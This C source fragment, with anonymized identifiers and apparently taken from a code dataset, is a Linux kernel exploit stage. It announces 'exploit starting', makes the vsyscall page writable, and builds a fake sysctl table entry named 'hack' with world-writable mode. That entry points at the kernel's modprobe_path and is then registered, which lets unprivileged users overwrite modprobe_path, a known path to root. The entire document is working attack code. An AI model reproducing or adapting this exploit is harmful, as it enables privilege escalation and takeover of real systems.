
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct ctl_table {char* procname; int mode; int maxlen; void* extra2; void* extra1; void* data; void* proc_handler; } ;
struct TYPE_2__ {int register_sysctl_table; scalar_t__ modprobe_path; scalar_t__ proc_dostring; int set_memory_rw; } ;


 scalar_t__ VAR_0 ;
 int FUNC_0 (int ,scalar_t__,int ) ;
 int FUNC_1 (int ,char*) ;
 int FUNC_2 (char*,char*,int) ;
 int FUNC_3 (char*,char,int) ;
 TYPE_1__* VAR_1 ;
 int FUNC_4 (char*) ;
 int FUNC_5 (int) ;
 int VAR_2 ;
 int FUNC_6 (char*,char*) ;
 int VAR_3 ;
 int VAR_4 ;

void FUNC_7(void)
{
    struct ctl_table *VAR_5;

    FUNC_1(VAR_2,"exploit starting\n");
    FUNC_4("making vsyscall page writable..\n\n");

    FUNC_0(VAR_1->set_memory_rw, VAR_0, VAR_3);

    FUNC_4("\nstage 1 completed\n");

    FUNC_5(5);

    FUNC_4("registering new sysctl..\n\n");

    VAR_5 = (struct ctl_table *)(VAR_0+0x850);

    FUNC_3((char *)(VAR_0+0x850), '\x00', 1952);

    FUNC_6((char *)(VAR_0+0xf00),"hack");
    FUNC_2((char *)(VAR_0+0xe00),"\x01\x00\x00\x00",4);
    VAR_5->procname = (char *)(VAR_0+0xf00);
    VAR_5->mode = 0666;
    VAR_5->proc_handler = (void *)(VAR_1->proc_dostring);
    VAR_5->data = (void *)(VAR_1->modprobe_path);
    VAR_5->maxlen=256;
    VAR_5->extra1 = (void *)(VAR_0+0xe00);
    VAR_5->extra2 = (void *)(VAR_0+0xd00);

    FUNC_0(VAR_1->register_sysctl_table, VAR_0+0x850, VAR_4);

    FUNC_4("stage 2 completed\n");
}
